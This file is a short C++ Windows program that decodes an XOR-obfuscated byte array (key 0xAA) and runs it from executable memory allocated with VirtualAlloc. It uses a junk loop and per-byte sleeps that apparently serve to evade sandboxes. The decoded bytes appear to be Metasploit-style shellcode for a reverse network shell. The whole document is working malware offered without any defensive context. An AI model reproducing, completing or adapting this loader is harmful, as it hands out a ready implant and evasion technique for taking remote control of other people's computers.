#include <windows.h>
#include <chrono>
#include <thread>

int main(int argc, char **argv) {
	for (int sl = 1; sl <= 10000; sl++)
	{
		sl = sl * 900;
	}
	char characters[] = {
	0x56, 0x42, 0x28, 0xaa, 0xaa, 0xaa, 0xca, 0x23, 0x4f, 0x9b, 0x6a, 0xce, 0x21, 0xfa, 0x9a, 0x21, 0xf8, 0xa6, 0x21, 0xf8, 0xbe, 0x21, 0xd8, 0x82, 0xa5, 0x1d, 0xe0, 0x8c, 0x9b, 0x55, 0x06, 0x96, 0xcb, 0xd6, 0xa8, 0x86, 0x8a, 0x6b, 0x65, 0xa7, 0xab, 0x6d, 0x48, 0x58, 0xf8, 0xfd, 0x21, 0xf8, 0xba, 0x21, 0xe0, 0x96, 0x21, 0xe6, 0xbb, 0xd2, 0x49, 0xe2, 0xab, 0x7b, 0xfb, 0x21, 0xf3, 0x8a, 0xab, 0x79, 0x21, 0xe3, 0xb2, 0x49, 0x90, 0xe3, 0x21, 0x9e, 0x21, 0xab, 0x7c, 0x9b, 0x55, 0x06, 0x6b, 0x65, 0xa7, 0xab, 0x6d, 0x92, 0x4a, 0xdf, 0x5c, 0xa9, 0xd7, 0x52, 0x91, 0xd7, 0x8e, 0xdf, 0x4e, 0xf2, 0x21, 0xf2, 0x8e, 0xab, 0x79, 0xcc, 0x21, 0xa6, 0xe1, 0x21, 0xf2, 0xb6, 0xab, 0x79, 0x21, 0xae, 0x21, 0xab, 0x7a, 0x23, 0xee, 0x8e, 0x8e, 0xf1, 0xf1, 0xcb, 0xf3, 0xf0, 0xfb, 0x55, 0x4a, 0xf5, 0xf5, 0xf0, 0x21, 0xb8, 0x41, 0x27, 0xf7, 0xc2, 0x99, 0x98, 0xaa, 0xaa, 0xc2, 0xdd, 0xd9, 0x98, 0xf5, 0xfe, 0xc2, 0xe6, 0xdd, 0x8c, 0xad, 0x23, 0x42, 0x55, 0x7a, 0x12, 0x3a, 0xab, 0xaa, 0xaa, 0x83, 0x6e, 0xfe, 0xfa, 0xc2, 0x83, 0x2a, 0xc1, 0xaa, 0x55, 0x7f, 0xc0, 0xa0, 0xc2, 0x6a, 0x02, 0x66, 0x25, 0xc2, 0xa8, 0xaa, 0xaa, 0xfa, 0x23, 0x4c, 0xfa, 0xfa, 0xfa, 0xfa, 0xea, 0xfa, 0xea, 0xfa, 0xc2, 0x40, 0xa5, 0x75, 0x4a, 0x55, 0x7f, 0x3d, 0xc0, 0xba, 0xfc, 0xfd, 0xc2, 0x33, 0x0f, 0xde, 0xcb, 0x55, 0x7f, 0x2f, 0x6a, 0xde, 0xa0, 0x55, 0xe4, 0xa2, 0xdf, 0x46, 0x42, 0xcd, 0xaa, 0xaa, 0xaa, 0xc0, 0xaa, 0xc0, 0xae, 0xfc, 0xfd, 0xc2, 0xa8, 0x73, 0x62, 0xf5, 0x55, 0x7f, 0x29, 0x52, 0xaa, 0xd4, 0x9c, 0x21, 0x9c, 0xc0, 0xea, 0xc2, 0xaa, 0xba, 0xaa, 0xaa, 0xfc, 0xc0, 0xaa, 0xc2, 0xf2, 0x0e, 0xf9, 0x4f, 0x55, 0x7f, 0x39, 0xf9, 0xc0, 0xaa, 0xfc, 0xf9, 0xfd, 0xc2, 0xa8, 0x73, 0x62, 0xf5, 0x55, 0x7f, 0x29, 0x52, 0xaa, 0xd7, 0x82, 0xf2, 0xc2, 0xaa, 0xea, 0xaa, 0xaa, 0xc0, 0xaa, 0xfa, 0xc2, 0xa1, 0x85, 0xa5, 0x9a, 0x55, 0x7f, 0xfd, 0xc2, 0xdf, 0xc4, 0xe7, 0xcb, 0x55, 0x7f, 0xf4, 0xf4, 0x55, 0xa6, 0x8e, 0xa5, 0x2f, 0xda, 0x55, 0x55, 0x55, 0x43, 0x31, 0x55, 0x55, 0x55, 0xab, 0x69, 0x83, 0x6c, 0xdf, 0x6b, 0x69, 0x11, 0x5a, 0x1f, 0x08, 0xfc, 0xc0, 0xaa, 0xf9, 0x55, 0x7f, 0xaa};
	for (unsigned int i = 0; i < sizeof characters; ++i)
	{
		std::this_thread::sleep_for(std::chrono::milliseconds(200));
		unsigned char val = (unsigned int)characters[i] ^ 0xAA; characters[i] = val;
	}
	void *exec = VirtualAlloc(0, sizeof characters, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, characters, sizeof characters);
	((void(*)())exec)();
}